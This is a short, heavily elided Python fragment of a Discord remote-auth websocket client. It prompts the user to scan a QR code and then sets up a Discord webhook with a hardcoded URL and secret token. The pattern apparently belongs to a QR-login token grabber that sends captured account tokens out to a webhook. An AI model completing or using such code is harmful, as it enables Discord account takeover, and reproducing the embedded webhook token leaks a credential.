...
class DiscordAuthWebsocket:
    ...
    def on_message(self, message):
        ...
        if op == Messages.HELLO:
            ...
            print(f'THREAD {self.thread} -> Please scan the QR code to continue.')
            ...
            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/824099736806096937/xd7QGVBs6rgr768fRzvx7h1wy5-eCLRv07gElV1ngOUatXGOtzjI7j2w8jifknjP3V_v')
